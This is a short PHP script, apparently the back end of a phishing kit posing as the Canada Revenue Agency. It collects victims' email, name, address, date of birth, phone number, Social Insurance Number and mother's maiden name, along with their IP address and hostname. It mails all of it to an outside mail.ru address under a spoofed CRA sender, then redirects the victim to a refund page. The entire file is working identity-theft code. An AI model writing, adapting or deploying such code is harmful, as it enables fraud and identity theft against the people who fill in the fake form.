<?php
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$message .= "====+++ Canada Revenue Agency +++====\n";
$message .= "Email : ".$_POST['email']."\n";
$message .= "Full Name : ".$_POST['name']."\n";
$message .= "Adress : ".$_POST['adres']."\n";
$message .= "Zip Code : ".$_POST['zip']."\n";
$message .= "DOB : ".$_POST['dob']."\n";
$message .= "Phone Number : ".$_POST['tel']."\n";
$message .= "Social Insurance Number  : ".$_POST['sin']."\n";
$message .= "Mother Maiden Name  : ".$_POST['mmn']."\n";
$message .= "Client IP : ".$ip."\n";
$message .= "HostName : ".$hostname."\n";
$message .= "=====+ -------- +=====\n";
$send = "rayanboujna@mail.ru";
$subject = "Billing CA *_* [".$_POST['name']."] $ip";
$headers = "From:  <billing@cra.com>";

mail($send,$subject,$message,$headers);
header("Location: refund.php");

?>
